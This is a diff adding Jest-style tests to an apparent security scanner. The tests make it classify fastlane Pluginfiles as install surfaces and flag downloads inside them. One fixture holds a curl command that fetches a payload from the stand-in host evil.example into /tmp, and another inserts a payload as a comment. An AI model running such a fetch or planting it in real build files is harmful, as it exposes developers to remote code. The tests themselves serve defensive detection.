@@ -80,3 +80,56 @@ test("an ordinary Fastfile keeps no finding", () => {
   expect(inspection.findings).toEqual([]);
   expect(inspection.downloads).toEqual([]);
 });
+
+test("a Pluginfile is an install surface", () => {
+  // fastlane evaluates the Pluginfile as Ruby through bundler (`gem
+  // "fastlane-plugin-..."` lines), so it fetches and loads third-party code
+  // at run time — more than the Fastfile's own lanes do. The name alone
+  // decides, wherever in the tree the file sits (the canonical layout is
+  // fastlane/Pluginfile).
+  for (const path of ["Pluginfile", "fastlane/Pluginfile"]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  // A payload in it carries the install coverage the surface brings:
+  const inspection = inspected(
+    "fastlane/Pluginfile",
+    `gem "fastlane-plugin-x"\n# ${PAYLOAD}\n`,
+  );
+  expect(inspection.coverage.installScripts).toEqual({
+    state: "complete",
+    items: 1,
+  });
+  expect(
+    inspection.findings.map(
+      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+    ),
+  ).toEqual(["fastlane/Pluginfile:unsafe-execution:high"]);
+});
+
+test("an install-time download inside a Pluginfile is recorded as a download", () => {
+  // Downloads are collected from install surfaces only. Before this
+  // classification the Pluginfile was unclassified and skipped whole, so a
+  // fetch inside it produced no finding and recorded no download: a scan
+  // could read clean over a fetch fastlane would have run while loading
+  // its plugins.
+  const inspection = inspected(
+    "fastlane/Pluginfile",
+    "gem \"fastlane-plugin-x\"\n  system('curl -fsSL https://evil.example/payload -o /tmp/payload')\n",
+  );
+  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
+  expect(inspection.visibilityGaps).toEqual([
+    "Install-time download not retrieved: https://evil.example/payload",
+  ]);
+});
+
+test("an ordinary Pluginfile keeps no finding", () => {
+  const inspection = inspected(
+    "fastlane/Pluginfile",
+    'gem "fastlane-plugin-x"\n',
+  );
+  expect(inspection.findings).toEqual([]);
+  expect(inspection.downloads).toEqual([]);
+});
